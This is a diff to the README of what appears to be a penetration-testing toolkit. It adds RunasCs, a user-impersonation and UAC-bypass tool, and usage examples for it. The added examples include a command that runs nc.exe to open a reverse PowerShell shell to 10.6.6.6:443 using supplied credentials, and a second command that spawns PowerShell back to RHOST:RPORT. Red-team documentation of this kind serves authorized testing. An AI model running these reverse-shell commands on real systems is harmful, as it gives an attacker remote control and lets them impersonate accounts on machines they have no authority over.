@@ -141,8 +141,24 @@ Supported tool families:
 - Seatbelt  
 - Inveigh  
 - ProcDump  
+- RunasCs  
 - SSH / tunneling helpers  
 - Nishang scripts  
+### Using RunasCs
+
+RunasCs is a C# implementation of RunAs for user impersonation and UAC bypass. After staging RunasCs.exe to the remote host, you can use it as follows:
+
+**Spawn Process with Network Credentials:**
+```powershell
+.\RunasCs.exe -d domain.tld -l 8 'username' 'password' 'C:\Windows\Temp\nc.exe 10.6.6.6 443 -e powershell.exe'
+```
+
+**Spawn Process with Logon:**
+```powershell
+.\RunasCs.exe username_here password_here powershell.exe -r RHOST:RPORT
+```
+
+See the [RunasCs GitHub](https://github.com/antonioCoco/RunasCs) for more usage details and options.
 
 Features:
 
